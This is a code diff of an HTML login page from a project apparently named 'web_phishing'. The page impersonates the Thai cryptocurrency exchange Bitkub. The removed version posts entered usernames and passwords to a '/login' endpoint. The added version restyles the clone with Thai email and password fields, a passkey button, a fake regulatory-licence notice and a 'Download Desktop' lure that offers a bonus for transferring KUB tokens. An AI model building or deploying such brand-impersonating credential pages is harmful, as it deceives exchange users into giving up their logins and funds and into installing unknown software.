@@ -1,173 +1,110 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to Bitkub</title>
-    <link rel="stylesheet" href="login.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bitkub</title>
+  <link rel="icon" href="logobitkub.png" type="image/x-icon">
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="login.css">
 </head>
-<body>
-    <div class="logo"><img src="/web_phishing/logo.svg" alt="Bitkub" ></div>
-    
-    <div class="container">
-        <h1>Sign in to Bitkub</h1>
-        
-        <div id="message" class="message" style="display: none;"></div>
-        
-        <div class="auth-form">
-            <form id="login-form">
-                <div class="auth-form-header">
-                    <label for="login-field" class="label">Username or email address</label>
-                    <input type="text" name="login" id="login-field" class="form-control" autocomplete="username" autofocus>
-                </div>
-                
-                <div class="auth-form-header">
-                    <div class="password-header">
-                        <label for="password" class="label">Password</label>
-                        <a href="#" id="forgot-password-link" class="forgot-password">Forgot password?</a>
-                    </div>
-                    <input type="password" name="password" id="password" class="form-control" autocomplete="current-password">
-                </div>
-                
-                <button type="submit" class="btn btn-primary">Sign in</button>
-            </form>
-        </div>
-        
-        <div id="forgot-password-form" style="display: none;">
-            <h2>Reset your password</h2>
-            <div class="auth-form">
-                <form id="reset-form">
-                    <div class="auth-form-header">
-                        <label for="email-field" class="label">Email address</label>
-                        <input type="email" name="email" id="email-field" class="form-control" required>
-                    </div>
-                    <button type="submit" class="btn btn-primary">Send reset link</button>
-                    <button type="button" id="back-to-login" class="btn">Back to login</button>
-                </form>
-            </div>
-        </div>
-        
-        <div class="create-account-callout">
-            <p>New to Bitkub? <a href="register.html">Create an account</a>.</p>
+<body class="bg-white">
+
+  <!-- Navigation -->
+  <nav class="flex items-center justify-between p-6 border-b max-w-7xl mx-auto">
+    <div class="flex items-center">
+      <span><img src="/web_phishing/logo.svg" alt="Logo" class="h-8 w-auto"></span>
+    </div>
+    <div class="flex justify-center">
+        <div class="flex space-x-8">
+          <a href="#" class="text-gray-600 hover:text-gray-900 text-lg">Home</a>
+          <a href="#" class="text-gray-600 hover:text-gray-900 text-lg">Get Started</a>
+          <a href="#" class="text-gray-600 hover:text-gray-900 text-lg">Benefits</a>
+          <a href="#" class="text-gray-600 hover:text-gray-900 text-lg">Support</a>
         </div>
     </div>
-    
-    <div class="footer">
-        <div class="footer-links">
-            <a href="#">Terms</a>
-            <a href="#">Privacy</a>
-            <a href="#">Security</a>
-            <a href="#">Contact</a>
-        </div>
-        <p>© 2025 Bitkub, Inc.</p>
+    <button class="bg-green-500 hover:bg-green-600 text-white px-6 py-2.5 rounded-md text-lg font-medium">
+        Download
+    </button>
+</nav>
+
+<div class="login-container">
+    <div class="image-section">
+      <img src="https://via.placeholder.com/500x400" alt="ภาพประกอบการลงทุน" class="max-w-full h-auto">
     </div>
-    
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const loginForm = document.getElementById('login-form');
-            const resetForm = document.getElementById('reset-form');
-            const messageDiv = document.getElementById('message');
-            const forgotPasswordLink = document.getElementById('forgot-password-link');
-            const backToLoginBtn = document.getElementById('back-to-login');
-            const forgotPasswordForm = document.getElementById('forgot-password-form');
-            
-            // จัดการเมื่อกดปุ่มส่งข้อมูลล็อกอิน
-            loginForm.addEventListener('submit', async function(e) {
-                e.preventDefault();
-                
-                const loginField = document.getElementById('login-field').value;
-                const passwordField = document.getElementById('password').value;
-                
-                if (!loginField || !passwordField) {
-                    showMessage('กรุณากรอกชื่อผู้ใช้/อีเมลและรหัสผ่าน', 'error');
-                    return;
-                }
-                
-                try {
-                    const response = await fetch('/login', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            login: loginField,
-                            password: passwordField
-                        })
-                    });
-                    
-                    const data = await response.json();
-                    
-                    if (data.success) {
-                        showMessage(data.message, 'success');
-                        // รอสักครู่แล้วเปลี่ยนหน้า
-                        setTimeout(() => {
-                            window.location.href = data.redirect;
-                        }, 1000);
-                    } else {
-                        showMessage(data.message, 'error');
-                    }
-                } catch (error) {
-                    showMessage('เกิดข้อผิดพลาดในการเชื่อมต่อกับเซิร์ฟเวอร์', 'error');
-                    console.error('Error:', error);
-                }
-            });
-            
-            // จัดการเมื่อกดลิงก์ลืมรหัสผ่าน
-            forgotPasswordLink.addEventListener('click', function(e) {
-                e.preventDefault();
-                loginForm.style.display = 'none';
-                forgotPasswordForm.style.display = 'block';
-            });
-            
-            // กลับไปหน้าล็อกอิน
-            backToLoginBtn.addEventListener('click', function() {
-                forgotPasswordForm.style.display = 'none';
-                loginForm.style.display = 'block';
-                messageDiv.style.display = 'none';
-            });
-            
-            // จัดการเมื่อกดส่งฟอร์มลืมรหัสผ่าน
-            resetForm.addEventListener('submit', async function(e) {
-                e.preventDefault();
-                
-                const emailField = document.getElementById('email-field').value;
-                
-                if (!emailField) {
-                    showMessage('กรุณากรอกอีเมล', 'error');
-                    return;
-                }
-                
-                try {
-                    const response = await fetch('/forgot-password', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            email: emailField
-                        })
-                    });
-                    
-                    const data = await response.json();
-                    
-                    if (data.success) {
-                        showMessage(data.message, 'success');
-                    } else {
-                        showMessage(data.message, 'error');
-                    }
-                } catch (error) {
-                    showMessage('เกิดข้อผิดพลาดในการเชื่อมต่อกับเซิร์ฟเวอร์', 'error');
-                    console.error('Error:', error);
-                }
-            });
-            
-            // ฟังก์ชันแสดงข้อความ
-            function showMessage(message, type) {
-                messageDiv.textContent = message;
-                messageDiv.className = `message ${type}`;
-                messageDiv.style.display = 'block';
-            }
-        });
-    </script>
+    <div class="form-section">
+      <div class="mb-8">
+        <h1 class="text-2xl font-bold text-gray-900 mb-2">เข้าสู่ระบบ</h1>
+      </div>
+      
+      <div class="mb-4">
+        <label for="email" class="block text-sm font-medium text-gray-700">อีเมล</label>
+        <input type="email" id="email" placeholder="กรอกอีเมล" class="focus:ring-green-500 focus:border-green-500">
+      </div>
+      
+      <div class="mb-4">
+        <label for="password" class="block text-sm font-medium text-gray-700">รหัสผ่าน</label>
+        <input type="password" id="password" placeholder="กรอกรหัสผ่าน" class="focus:ring-green-500 focus:border-green-500">
+      </div>
+      
+      <div class="text-right mb-4">
+        <a href="#" class="text-green-600 hover:text-green-700 text-sm">ลืมรหัสผ่าน?</a>
+      </div>
+      
+      <button type="submit" class="login-button">เข้าสู่ระบบ</button>
+      
+      <div class="divider">
+        <span>หรือ</span>
+      </div>
+      
+      <button class="passkey-button">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
+        </svg>
+        เข้าระบบด้วย Passkey
+      </button>
+      
+      <div class="mt-6 text-center text-sm text-gray-600">
+        หากยังไม่ได้เป็นสมาชิก <a href="#" class="text-green-600 hover:text-green-700 font-medium">สมัครที่นี่</a>
+      </div>
+      
+      <div class="mt-12 text-xs text-gray-500">
+        <ul class="list-disc pl-5 space-y-2">
+          <li>บริษัท เอ็กซ์เชนจ์ที่ได้รับอนุญาตถูกต้องตามกฎหมายจากกระทรวงการคลังและจดทะเบียนกับกระทรวงพาณิชย์</li>
+          <li>คุณสามารถดูรายละเอียดเกี่ยวกับการประมวลผลข้อมูลส่วนบุคคลของบริษัทได้ที่ <a href="#" class="text-green-600 hover:underline">ประกาศความเป็นส่วนตัว</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- CTA Section -->
+  <div class="bg-emerald-500 text-white py-16">
+    <div class="max-w-6xl mx-auto px-4 text-center">
+      <h2 class="text-3xl font-bold mb-4">
+        Join us in the new era of investment with Start Bonus
+      </h2>
+      <p class="mb-8">
+        Transfer 50 KUB to funding account using Desktop Application and receive +50 KUB Bonus
+      </p>
+      <button class="bg-white text-emerald-500 px-8 py-3 rounded-md font-medium">
+        Download Desktop
+      </button>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="bg-white py-8 border-t">
+    <div class="max-w-6xl mx-auto px-4">
+      <div class="flex justify-between items-center">
+        <div class="text-sm text-gray-600">
+          © 2024 CryptoEx. All Rights Reserved
+        </div>
+        <div class="text-sm text-gray-600">
+          Cryptocurrency trading involves high risks. Please trade responsibly.
+        </div>
+      </div>
+    </div>
+  </footer>
+
 </body>
 </html>
